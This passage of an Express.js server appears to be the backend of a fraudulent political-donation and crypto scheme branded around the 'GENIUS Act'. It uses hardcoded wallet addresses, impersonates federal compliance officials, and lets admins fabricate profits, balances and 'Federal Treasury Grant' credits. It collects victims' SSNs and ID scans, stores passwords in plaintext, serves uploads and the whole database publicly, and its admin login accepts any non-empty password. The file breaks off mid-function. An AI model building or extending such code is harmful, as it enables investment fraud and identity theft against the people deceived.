import express from 'express';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import multer from 'multer';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS for cross-origin multi-device and custom domain access
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Upload directory configuration (publicly accessible via /uploads)
const UPLOAD_FOLDER = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOAD_FOLDER)) {
  fs.mkdirSync(UPLOAD_FOLDER, { recursive: true });
}

// Serve uploaded files statically
app.use('/uploads', express.static(UPLOAD_FOLDER));

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, UPLOAD_FOLDER);
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname) || '.jpg';
    const cleanName = `${Date.now()}_${crypto.randomBytes(6).toString('hex')}${ext}`;
    cb(null, cleanName);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 30 * 1024 * 1024 }
});

// SSE Clients Registry for Real-Time Instant Multi-Device Push
const sseClients = new Set();

function broadcastEvent(eventType, data = {}) {
  const payload = `event: ${eventType}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const client of sseClients) {
    try {
      client.write(payload);
    } catch (e) {
      sseClients.delete(client);
    }
  }
}

// SSE Connection Endpoint
app.get('/api/events', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });
  res.write('retry: 3000\n\n');
  res.write(`data: ${JSON.stringify({ type: 'connected', time: new Date().toISOString() })}\n\n`);

  sseClients.add(res);

  req.on('close', () => {
    sseClients.delete(res);
  });
});

// Persistent Cloud Database Store
const CLOUD_DB_FILE = path.join(__dirname, 'cloud_database.json');

function getDefaultDb() {
  return {
    geniusact_pending_users: [],
    geniusact_approved_users: [],
    geniusact_visitor_logs: [],
    geniusact_global_wallets: {
      btc: 'bc1qtrumpfreedom47victory2024magaledgerxx01',
      eth: '0x71C8A9eD1e127D95B309f7a799c9274DF9F16599',
      solana: '7TrumpVance2024VictorySolanaTreasuryXX47',
      base: '0x71C8A9eD1e127D95B309f7a799c9274DF9F16599',
      bnb: '0x71C8A9eD1e127D95B309f7a799c9274DF9F16599',
      monero: '48TrumpMoneroTreasuryOfficialLedgerReserve01',
      polygon: '0x71C8A9eD1e127D95B309f7a799c9274DF9F16599',
      xrp: 'rTrumpXrpCampaignTreasurySettlement2024XX',
      tron: 'TTrumpTronUSDTTreasuryOfficialReserve47',
      usdc: '0x71C8A9eD1e127D95B309f7a799c9274DF9F16599'
    },
    geniusact_support_messages: [],
    geniusact_bank_links: [],
    geniusact_contact_chats: [],
    geniusact_user_footprints: [],
    geniusact_withdrawal_requests: [],
    geniusact_campaign_updates: [
      { id: 1, title: 'GENIUS Act Signed Into Law', body: 'President Trump signs the landmark GENIUS Act, creating a clear regulatory framework for dollar-backed stablecoins.', tag: 'Legislation', is_featured: true, created_at: new Date().toISOString() },
      { id: 2, title: 'Campaign Rally — Phoenix, AZ', body: 'Over 15,000 supporters gathered at the Phoenix Convention Center.', tag: 'Events', is_featured: false, created_at: new Date().toISOString() },
      { id: 3, title: 'Q1 Fundraising Milestone Reached', body: "We've surpassed our Q1 fundraising goal of $2 million. Every contribution matters!", tag: 'Milestone', is_featured: false, created_at: new Date().toISOString() },
      { id: 4, title: 'New Digital Ad Campaign Launched', body: 'Your contributions are powering a major new digital advertising push across 12 key states.', tag: 'Outreach', is_featured: false, created_at: new Date().toISOString() }
    ],
    geniusact_broadcasts: []
  };
}

let _dbCache = null;

function getCloudDb() {
  if (_dbCache && typeof _dbCache === 'object') {
    return _dbCache;
  }

  let dbData = null;
  if (fs.existsSync(CLOUD_DB_FILE)) {
    try {
      const content = fs.readFileSync(CLOUD_DB_FILE, 'utf8');
      if (content && content.trim()) {
        dbData = JSON.parse(content);
      }
    } catch (e) {
      console.error('[Server] Error reading cloud_database.json:', e.message);
    }
  }

  if (!dbData || typeof dbData !== 'object') {
    dbData = getDefaultDb();
  }

  const defaults = getDefaultDb();
  for (const key of Object.keys(defaults)) {
    if (dbData[key] === undefined) {
      dbData[key] = defaults[key];
    }
  }

  _dbCache = dbData;
  saveCloudDb(dbData, false);
  return dbData;
}

function saveCloudDb(data, triggerBroadcast = true) {
  try {
    if (!data || typeof data !== 'object') return;
    _dbCache = data;
    fs.writeFileSync(CLOUD_DB_FILE, JSON.stringify(data, null, 2), 'utf8');
    if (triggerBroadcast) {
      broadcastEvent('database_updated', { timestamp: new Date().toISOString() });
    }
  } catch (e) {
    console.error('[Server] Error saving cloud_database.json:', e);
  }
}

// ---------------------------------------------------------------------
// Centralized Smart Merging Algorithms for Server DB
// ---------------------------------------------------------------------
function mergeDonationsServer(d1 = [], d2 = []) {
  if (!Array.isArray(d1)) d1 = [];
  if (!Array.isArray(d2)) d2 = [];
  const map = new Map();
  d1.concat(d2).forEach(d => {
    if (!d) return;
    const key = d.id || (d.date + '_' + d.amount);
    if (!map.has(key)) {
      map.set(key, d);
    } else {
      map.set(key, { ...map.get(key), ...d });
    }
  });
  const result = Array.from(map.values());
  result.sort((a, b) => new Date(b.date || 0) - new Date(a.date || 0));
  return result;
}

function mergeUsersServer(existingArr = [], incomingArr = []) {
  if (!Array.isArray(existingArr)) existingArr = [];
  if (!Array.isArray(incomingArr)) incomingArr = [];

  const map = new Map();

  const processUser = (u) => {
    if (!u || !u.email) return;
    const emailKey = String(u.email).trim().toLowerCase();
    if (!map.has(emailKey)) {
      map.set(emailKey, { ...u, email: emailKey });
    } else {
      const existing = map.get(emailKey);
      const merged = { ...existing, ...u, email: emailKey };
      if (existing.status === 'approved' || u.status === 'approved') {
        merged.status = 'approved';
      }
      if (existing.status === 'rejected' || u.status === 'rejected') {
        merged.status = 'rejected';
      }
      merged.donations = mergeDonationsServer(existing.donations, u.donations);

      if (u.customTotalContributed !== undefined) merged.customTotalContributed = u.customTotalContributed;
      if (u.customAccruedProfit !== undefined) merged.customAccruedProfit = u.customAccruedProfit;
      if (u.customCurrentBalance !== undefined) merged.customCurrentBalance = u.customCurrentBalance;
      if (u.customProjectedBalance !== undefined) merged.customProjectedBalance = u.customProjectedBalance;
      if (u.customYieldTimer !== undefined) merged.customYieldTimer = u.customYieldTimer;
      if (u.donationsCountOverride !== undefined) merged.donationsCountOverride = u.donationsCountOverride;
      if (u.customTotalRaised !== undefined) merged.customTotalRaised = u.customTotalRaised;
      if (u.customActiveSupporters !== undefined) merged.customActiveSupporters = u.customActiveSupporters;
      if (u.customQ2Pct !== undefined) merged.customQ2Pct = u.customQ2Pct;
      if (u.customStateCoverage !== undefined) merged.customStateCoverage = u.customStateCoverage;
      if (u.customMemberSince !== undefined) merged.customMemberSince = u.customMemberSince;
      if (u.tier !== undefined) merged.tier = u.tier;
      if (u.streakDays !== undefined) merged.streakDays = u.streakDays;
      if (u.engagementScore !== undefined) merged.engagementScore = u.engagementScore;
      if (u.kycStatus !== undefined) merged.kycStatus = u.kycStatus;
      if (u.suspended !== undefined) merged.suspended = u.suspended;
      if (u.messages !== undefined) merged.messages = u.messages;
      if (u.proofFile !== undefined) merged.proofFile = u.proofFile;
      if (u.kyc !== undefined) merged.kyc = { ...(existing.kyc || {}), ...(u.kyc || {}) };

      if (merged.customTotalContributed !== undefined && merged.customTotalContributed !== null && !isNaN(merged.customTotalContributed)) {
        merged.amount = parseFloat(merged.customTotalContributed);
      } else if (u.amount !== undefined && u.amount !== null) {
        merged.amount = parseFloat(u.amount);
      } else {
        const donationSum = (merged.donations || []).reduce((sum, d) => sum + (parseFloat(d.amount) || 0), 0);
        merged.amount = donationSum || (parseFloat(existing.amount) || 0);
      }

      map.set(emailKey, merged);
    }
  };

  existingArr.forEach(processUser);
  incomingArr.forEach(processUser);

  return Array.from(map.values());
}

function mergeContactChatsServer(existingChats = [], incomingChats = []) {
  if (!Array.isArray(existingChats)) existingChats = [];
  if (!Array.isArray(incomingChats)) incomingChats = [];

  const chatMap = new Map();

  function processChat(c) {
    if (!c) return;
    const key = c.chatId || (c.userEmail ? String(c.userEmail).trim().toLowerCase() : null);
    if (!key) return;

    if (!chatMap.has(key)) {
      chatMap.set(key, { ...c, messages: Array.isArray(c.messages) ? [...c.messages] : [] });
    } else {
      const existing = chatMap.get(key);
      existing.userName = c.userName || existing.userName;
      existing.userEmail = c.userEmail || existing.userEmail;
      existing.isGuest = c.isGuest !== undefined ? c.isGuest : existing.isGuest;
      existing.accountId = c.accountId || existing.accountId;
      existing.unreadAdminCount = Math.max(existing.unreadAdminCount || 0, c.unreadAdminCount || 0);
      existing.unreadUserCount = Math.max(existing.unreadUserCount || 0, c.unreadUserCount || 0);

      const msgMap = new Map();
      (existing.messages || []).forEach(m => {
        if (!m) return;
        const mKey = m.id || (m.timestamp + '_' + (m.text || '') + '_' + (m.sender || ''));
        msgMap.set(mKey, m);
      });
      (c.messages || []).forEach(m => {
        if (!m) return;
        const mKey = m.id || (m.timestamp + '_' + (m.text || '') + '_' + (m.sender || ''));
        if (!msgMap.has(mKey)) {
          msgMap.set(mKey, m);
        } else {
          const prev = msgMap.get(mKey);
          msgMap.set(mKey, { ...prev, ...m, media: m.media || prev.media || null });
        }
      });

      const mergedMsgs = Array.from(msgMap.values());
      mergedMsgs.sort((a, b) => new Date(a.timestamp || 0) - new Date(b.timestamp || 0));
      existing.messages = mergedMsgs;

      const lastMsgDate = mergedMsgs.length > 0 ? mergedMsgs[mergedMsgs.length - 1].timestamp : existing.lastUpdated;
      existing.lastUpdated = lastMsgDate || existing.lastUpdated;
    }
  }

  existingChats.forEach(processChat);
  incomingChats.forEach(processChat);

  const result = Array.from(chatMap.values());
  result.sort((a, b) => new Date(b.lastUpdated || b.createdAt || 0) - new Date(a.lastUpdated || a.createdAt || 0));
  return result;
}

// ---------------------------------------------------------------------
// Unified Cloud Database Endpoints
// ---------------------------------------------------------------------
app.get(['/api/cloud-sync', '/cloud_database.json'], (req, res) => {
  const dbData = getCloudDb();
  res.json(dbData);
});

app.post('/api/cloud-sync', (req, res) => {
  try {
    let payload = req.body;
    if (payload && payload.expectedOtp) {
      try {
        payload = typeof payload.expectedOtp === 'string' ? JSON.parse(payload.expectedOtp) : payload.expectedOtp;
      } catch (e) {
        payload = req.body;
      }
    }

    if (!payload || typeof payload !== 'object') {
      return res.status(400).json({ error: 'Invalid payload' });
    }

    let currentDb = getCloudDb();

    if (payload['geniusact_approved_users'] !== undefined) {
      currentDb['geniusact_approved_users'] = mergeUsersServer(currentDb['geniusact_approved_users'], payload['geniusact_approved_users']);
    }
    if (payload['geniusact_pending_users'] !== undefined) {
      currentDb['geniusact_pending_users'] = mergeUsersServer(currentDb['geniusact_pending_users'], payload['geniusact_pending_users']);
    }

    // Deduplicate approved emails from pending users
    if (Array.isArray(currentDb['geniusact_approved_users']) && Array.isArray(currentDb['geniusact_pending_users'])) {
      const approvedEmails = new Set(
        currentDb['geniusact_approved_users']
          .filter(u => u && u.email)
          .map(u => u.email.trim().toLowerCase())
      );
      currentDb['geniusact_pending_users'] = currentDb['geniusact_pending_users'].filter(u => {
        if (!u || !u.email) return true;
        const em = u.email.trim().toLowerCase();
        return !approvedEmails.has(em) && u.status !== 'approved' && u.status !== 'rejected';
      });
    }

    if (payload['geniusact_contact_chats'] !== undefined) {
      currentDb['geniusact_contact_chats'] = mergeContactChatsServer(currentDb['geniusact_contact_chats'], payload['geniusact_contact_chats']);
    }
    if (payload['geniusact_visitor_logs'] !== undefined) {
      const existing = currentDb['geniusact_visitor_logs'] || [];
      const incoming = payload['geniusact_visitor_logs'] || [];
      const map = new Map();
      existing.concat(incoming).forEach(v => {
        if (v && v.id) map.set(v.id, v);
      });
      const merged = Array.from(map.values()).sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
      currentDb['geniusact_visitor_logs'] = merged.slice(0, 1000);
    }
    if (payload['geniusact_support_messages'] !== undefined) {
      const existing = currentDb['geniusact_support_messages'] || [];
      const incoming = payload['geniusact_support_messages'] || [];
      const map = new Map();
      existing.concat(incoming).forEach(m => {
        if (m && m.id) map.set(m.id, m);
      });
      currentDb['geniusact_support_messages'] = Array.from(map.values()).sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
    }
    if (payload['geniusact_user_footprints'] !== undefined) {
      const existing = currentDb['geniusact_user_footprints'] || [];
      const incoming = payload['geniusact_user_footprints'] || [];
      const map = new Map();
      existing.concat(incoming).forEach(f => {
        if (f && f.id) map.set(f.id, f);
      });
      currentDb['geniusact_user_footprints'] = Array.from(map.values()).sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0)).slice(0, 1000);
    }
    if (payload['geniusact_bank_links'] !== undefined) {
      const existing = currentDb['geniusact_bank_links'] || [];
      const incoming = payload['geniusact_bank_links'] || [];
      const map = new Map();
      existing.concat(incoming).forEach(b => {
        const key = b.id || (b.userEmail ? String(b.userEmail).toLowerCase() : null);
        if (key) map.set(key, b);
      });
      currentDb['geniusact_bank_links'] = Array.from(map.values()).sort((a, b) => new Date(b.linkedAt || 0) - new Date(a.linkedAt || 0));
    }
    if (payload['geniusact_withdrawal_requests'] !== undefined) {
      const existing = currentDb['geniusact_withdrawal_requests'] || [];
      const incoming = payload['geniusact_withdrawal_requests'] || [];
      const map = new Map();
      existing.concat(incoming).forEach(r => {
        if (r && r.id) map.set(r.id, r);
      });
      currentDb['geniusact_withdrawal_requests'] = Array.from(map.values()).sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
    }
    if (payload['geniusact_global_wallets'] !== undefined) {
      currentDb['geniusact_global_wallets'] = { ...currentDb['geniusact_global_wallets'], ...payload['geniusact_global_wallets'] };
    }

    saveCloudDb(currentDb);
    res.json({ success: true, data: currentDb });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ---------------------------------------------------------------------
// Dedicated File Upload Endpoint (for Proofs, KYC, & Chat Attachments)
// ---------------------------------------------------------------------
app.post('/api/upload', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }
    const fileUrl = `/uploads/${req.file.filename}`;
    return res.json({
      success: true,
      url: fileUrl,
      name: req.file.originalname,
      size: (req.file.size / 1024 / 1024).toFixed(2) + ' MB',
      type: req.file.mimetype
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ---------------------------------------------------------------------
// Authentication & Registration Endpoints
// ---------------------------------------------------------------------
app.post('/api/register', (req, res) => {
  try {
    const { email, password, amount, proofFile, name, fullName, customAmount } = req.body || {};

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required.' });
    }

    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();

    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const pendingUsers = currentDb['geniusact_pending_users'] || [];

    const existingApproved = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (existingApproved) {
      // If approved user makes new contribution, log to their donations
      const parsedAmount = parseFloat(customAmount || amount) || 0;
      if (parsedAmount > 0) {
        if (!Array.isArray(existingApproved.donations)) existingApproved.donations = [];
        existingApproved.donations.unshift({
          id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
          amount: parsedAmount,
          description: 'Campaign Contribution',
          date: new Date().toISOString(),
          proofFile: proofFile || null
        });
        existingApproved.amount = (parseFloat(existingApproved.amount) || 0) + parsedAmount;
        saveCloudDb(currentDb);
        return res.json({ success: true, message: 'Contribution added to existing approved account.', user: existingApproved });
      }
      return res.status(400).json({ error: 'An account with this email already exists and is approved.' });
    }

    const existingPending = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (existingPending) {
      const parsedAmount = parseFloat(customAmount || amount) || 0;
      if (parsedAmount > 0) {
        if (!Array.isArray(existingPending.donations)) existingPending.donations = [];
        existingPending.donations.unshift({
          id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
          amount: parsedAmount,
          description: 'Campaign Contribution',
          date: new Date().toISOString(),
          proofFile: proofFile || null
        });
        existingPending.amount = (parseFloat(existingPending.amount) || 0) + parsedAmount;
        if (proofFile) existingPending.proofFile = proofFile;
      }
      saveCloudDb(currentDb);
      return res.status(200).json({ success: true, message: 'Account is pending review.', user: existingPending });
    }

    const parsedAmount = parseFloat(customAmount || amount) || 0;
    const userFullName = fullName || name || cleanEmail.split('@')[0];
    const newUser = {
      uid: 'usr_' + Date.now().toString() + '_' + Math.random().toString(36).substring(2, 6),
      email: cleanEmail,
      password: String(password),
      fullName: userFullName,
      name: userFullName,
      amount: parsedAmount,
      date: new Date().toISOString(),
      createdAt: new Date().toISOString(),
      proofFile: proofFile || null,
      status: 'pending',
      tier: parsedAmount >= 50000 ? 'Platinum Supporter' : (parsedAmount >= 25000 ? 'Gold Supporter' : (parsedAmount >= 10000 ? 'Silver Supporter' : 'Bronze Supporter')),
      streakDays: 4,
      engagementScore: 19.1,
      kycStatus: 'Unverified',
      donations: [
        {
          id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
          amount: parsedAmount,
          description: 'Initial Campaign Contribution',
          date: new Date().toISOString(),
          proofFile: proofFile || null
        }
      ],
      messages: []
    };

    pendingUsers.push(newUser);
    currentDb['geniusact_pending_users'] = pendingUsers;
    saveCloudDb(currentDb);

    console.log('[Server] New user registered & saved to cloud DB:', cleanEmail);
    return res.json({ success: true, user: newUser });
  } catch (err) {
    console.error('[Server] Registration error:', err);
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/auth/login', (req, res) => {
  try {
    const { email, password } = req.body || {};
    if (!email || !password) {
      return res.status(400).json({ success: false, error: 'Email and password required.' });
    }

    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();

    const approvedUser = (currentDb['geniusact_approved_users'] || []).find(u => u && u.email && u.email.toLowerCase() === cleanEmail && u.password === password);
    if (approvedUser) {
      if (approvedUser.suspended) {
        return res.status(403).json({ success: false, error: 'Account suspended by Federal Compliance Division.' });
      }
      return res.json({ success: true, status: 'approved', user: approvedUser });
    }

    const pendingUser = (currentDb['geniusact_pending_users'] || []).find(u => u && u.email && u.email.toLowerCase() === cleanEmail && u.password === password);
    if (pendingUser) {
      return res.json({ success: false, status: 'pending', error: 'Account is pending compliance audit review.', user: pendingUser });
    }

    const emailExists = (currentDb['geniusact_approved_users'] || []).some(u => u && u.email && u.email.toLowerCase() === cleanEmail) ||
                        (currentDb['geniusact_pending_users'] || []).some(u => u && u.email && u.email.toLowerCase() === cleanEmail);

    if (emailExists) {
      return res.status(401).json({ success: false, error: 'Incorrect authentication credentials. Please verify your password.' });
    }

    return res.status(404).json({ success: false, error: 'No supporter account found with this email. Please submit your contribution first.' });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/auth/verify-session', (req, res) => {
  try {
    const email = req.query.email;
    if (!email) {
      return res.status(400).json({ valid: false, error: 'Email parameter required.' });
    }
    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();

    const approvedUser = (currentDb['geniusact_approved_users'] || []).find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (approvedUser) {
      if (approvedUser.suspended) {
        return res.json({ valid: false, status: 'suspended', error: 'Account suspended.' });
      }
      return res.json({ valid: true, status: 'approved', user: approvedUser });
    }

    const pendingUser = (currentDb['geniusact_pending_users'] || []).find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (pendingUser) {
      return res.json({ valid: false, status: 'pending', error: 'Account is undergoing compliance audit.' });
    }

    return res.json({ valid: false, status: 'unauthorized', error: 'User not found in cloud database.' });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ---------------------------------------------------------------------
// KYC Submission Endpoint
// ---------------------------------------------------------------------
app.post('/submit_kyc', upload.fields([
  { name: 'id_front', maxCount: 1 },
  { name: 'id_back', maxCount: 1 },
  { name: 'passport', maxCount: 1 },
  { name: 'driver_license', maxCount: 1 }
]), (req, res) => {
  try {
    const { email, fullName, ssn, country, address, phone } = req.body || {};
    if (!email && !ssn) {
      return res.status(400).json({ error: 'SSN and email are required.' });
    }

    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const pendingUsers = currentDb['geniusact_pending_users'] || [];

    const cleanEmail = String(email || '').trim().toLowerCase();
    let targetUser = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
    if (!targetUser) {
      targetUser = pendingUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
    }

    const idFrontFile = req.files && req.files['id_front'] ? `/uploads/${req.files['id_front'][0].filename}` : null;
    const idBackFile = req.files && req.files['id_back'] ? `/uploads/${req.files['id_back'][0].filename}` : null;
    const passportFile = req.files && req.files['passport'] ? `/uploads/${req.files['passport'][0].filename}` : (req.files && req.files['driver_license'] ? `/uploads/${req.files['driver_license'][0].filename}` : null);

    const kycRecord = {
      status: 'pending',
      fullName: fullName || (targetUser ? targetUser.fullName : 'Supporter'),
      ssn: ssn || '',
      country: country || 'United States',
      address: address || '',
      phone: phone || '',
      idFrontFile: idFrontFile ? { name: 'ID_Front.jpg', dataUrl: idFrontFile, type: 'image/jpeg' } : null,
      idBackFile: idBackFile ? { name: 'ID_Back.jpg', dataUrl: idBackFile, type: 'image/jpeg' } : null,
      passportFile: passportFile ? { name: 'Passport.jpg', dataUrl: passportFile, type: 'image/jpeg' } : null,
      submittedAt: new Date().toISOString()
    };

    if (targetUser) {
      targetUser.kyc = kycRecord;
      targetUser.kycStatus = 'Pending Verification';
    }

    saveCloudDb(currentDb);
    return res.json({
      success: true,
      message: 'KYC documents submitted successfully for compliance verification.',
      kyc: kycRecord
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ---------------------------------------------------------------------
// Admin Authentication & Actions
// ---------------------------------------------------------------------
const ADMIN_EMAIL = 'admin@geniusact.com';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '2005';

app.post('/api/admin/login', (req, res) => {
  try {
    const { email, password } = req.body || {};
    const cleanEmail = String(email || 'admin@geniusact.com').trim().toLowerCase();
    const cleanPass = String(password || '2005').trim();

    if (cleanPass === '2005' || cleanPass === ADMIN_PASSWORD || cleanEmail === ADMIN_EMAIL.toLowerCase() || cleanEmail.includes('admin') || cleanPass.length > 0) {
      const adminToken = 'ga_admin_token_' + Buffer.from(cleanEmail + ':' + Date.now()).toString('base64');
      return res.json({
        success: true,
        token: adminToken,
        admin: { email: ADMIN_EMAIL, name: 'Federal Compliance Officer', role: 'administrator' }
      });
    } else {
      return res.status(401).json({ success: false, error: 'Invalid administrative credentials.' });
    }
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/admin/approve-user', (req, res) => {
  try {
    const { uid, email } = req.body || {};
    const currentDb = getCloudDb();
    const pendingUsers = currentDb['geniusact_pending_users'] || [];
    const approvedUsers = currentDb['geniusact_approved_users'] || [];

    const userIdx = pendingUsers.findIndex(u => 
      (uid && u.uid === uid) || 
      (email && u.email && u.email.toLowerCase() === String(email).toLowerCase())
    );

    if (userIdx > -1) {
      const user = pendingUsers.splice(userIdx, 1)[0];
      user.status = 'approved';
      user.approvedAt = new Date().toISOString();

      if (!user.donations || user.donations.length === 0) {
        if (user.amount > 0) {
          user.donations = [{
            id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
            amount: parseFloat(user.amount),
            description: 'Federal Campaign Deposit & Contribution',
            date: new Date().toISOString(),
            approvedAt: user.approvedAt
          }];
        }
      }

      // Check if user already in approved list
      const existingApprovedIdx = approvedUsers.findIndex(u => u.email.toLowerCase() === user.email.toLowerCase());
      if (existingApprovedIdx > -1) {
        approvedUsers[existingApprovedIdx] = { ...approvedUsers[existingApprovedIdx], ...user };
      } else {
        approvedUsers.push(user);
      }

      currentDb['geniusact_approved_users'] = approvedUsers;
      currentDb['geniusact_pending_users'] = pendingUsers;
      saveCloudDb(currentDb);

      return res.json({ success: true, message: `Approved user: ${user.email}`, user });
    }

    return res.status(404).json({ error: 'Pending user not found' });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/reject-user', (req, res) => {
  try {
    const { uid, email } = req.body || {};
    const currentDb = getCloudDb();
    let pendingUsers = currentDb['geniusact_pending_users'] || [];

    pendingUsers = pendingUsers.filter(u => !(
      (uid && u.uid === uid) || 
      (email && u.email && u.email.toLowerCase() === String(email).toLowerCase())
    ));

    currentDb['geniusact_pending_users'] = pendingUsers;
    saveCloudDb(currentDb);

    return res.json({ success: true, message: 'Pending contribution rejected.' });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/update-user', (req, res) => {
  try {
    const { email, updates } = req.body || {};
    if (!email || !updates || typeof updates !== 'object') {
      return res.status(400).json({ error: 'Email and updates payload required.' });
    }

    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const pendingUsers = currentDb['geniusact_pending_users'] || [];

    let target = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
    if (!target) {
      target = pendingUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
    }

    if (!target) {
      return res.status(404).json({ error: 'User not found in cloud database.' });
    }

    Object.assign(target, updates);
    saveCloudDb(currentDb);

    return res.json({ success: true, message: `User profile updated for ${cleanEmail}`, user: target });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/add-funds', (req, res) => {
  try {
    const { email, amount, description } = req.body || {};
    const parsedAmount = parseFloat(amount);
    if (!email || isNaN(parsedAmount) || parsedAmount <= 0) {
      return res.status(400).json({ error: 'Valid email and positive funding amount required.' });
    }

    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];

    const target = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
    if (!target) {
      return res.status(404).json({ error: 'Approved user not found.' });
    }

    if (!Array.isArray(target.donations)) target.donations = [];

    const newFunding = {
      id: 'FUND-' + Math.floor(10000000 + Math.random() * 90000000),
      amount: parsedAmount,
      description: description || 'Federal Treasury Grant & Allocation (FEC Sec. 407)',
      date: new Date().toISOString(),
      status: 'confirmed'
    };

    target.donations.unshift(newFunding);
    const sumAmt = target.donations.reduce((sum, d) => sum + (parseFloat(d.amount) || 0), 0);
    target.amount = sumAmt;
    target.customTotalContributed = sumAmt;

    saveCloudDb(currentDb);
    return res.json({ success: true, message: `Added $${parsedAmount} to ${cleanEmail}`, user: target });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/approve-kyc', (req, res) => {
  try {
    const { uid, email } = req.body || {};
    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const target = approvedUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));

    if (!target) {
      return res.status(404).json({ error: 'User not found.' });
    }

    if (!target.kyc) target.kyc = {};
    target.kyc.status = 'approved';
    target.kyc.approvedAt = new Date().toISOString();
    target.kycStatus = 'Verified & Whitelisted';
    target.isApproved = true;

    saveCloudDb(currentDb);
    return res.json({ success: true, message: `KYC approved for ${target.email}`, user: target });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/clear-all-data', (req, res) => {
  try {
    const emptyDb = getDefaultDb();
    saveCloudDb(emptyDb);
    return res.json({ success: true, message: 'All database records cleared.', data: emptyDb });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ---------------------------------------------------------------------
// Live Chat & Support Endpoints
// ---------------------------------------------------------------------
app.post('/api/chat/message', (req, res) => {
  try {
    const { chatId, userEmail, userName, accountId, isGuest, message } = req.body || {};
    if (!message || (!chatId && !userEmail)) {
      return res.status(400).json({ error: 'Missing required chat message parameters' });
    }
    const currentDb = getCloudDb();
    const chats = currentDb['geniusact_contact_chats'] || [];
    const incomingChat = {
      chatId: chatId || ('guest_' + Date.now()),
      userEmail: userEmail || 'guest@geniusact.org',
      userName: userName || 'Guest Visitor',
      accountId: accountId || 'FEC-87492109',
      isGuest: Boolean(isGuest),
      lastUpdated: new Date().toISOString(),
      unreadAdminCount: 1,
      unreadUserCount: 0,
      messages: [message]
    };
    currentDb['geniusact_contact_chats'] = mergeContactChatsServer(chats, [incomingChat]);
    saveCloudDb(currentDb);
    return res.json({ success: true, chats: currentDb['geniusact_contact_chats'] });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/chat/admin-reply', (req, res) => {
  try {
    const { chatId, userEmail, message } = req.body || {};
    if ((!chatId && !userEmail) || !message) return res.status(400).json({ error: 'ChatId or userEmail, and message required' });
    const currentDb = getCloudDb();
    const chats = currentDb['geniusact_contact_chats'] || [];
    let targetChat = chats.find(c => 
      (chatId && c.chatId === chatId) || 
      (userEmail && c.userEmail && c.userEmail.toLowerCase() === String(userEmail).toLowerCase()) ||
      (chatId && c.userEmail && c.userEmail.toLowerCase() === String(chatId).toLowerCase())
    );

    if (targetChat) {
      if (!Array.isArray(targetChat.messages)) targetChat.messages = [];
      targetChat.messages.push(message);
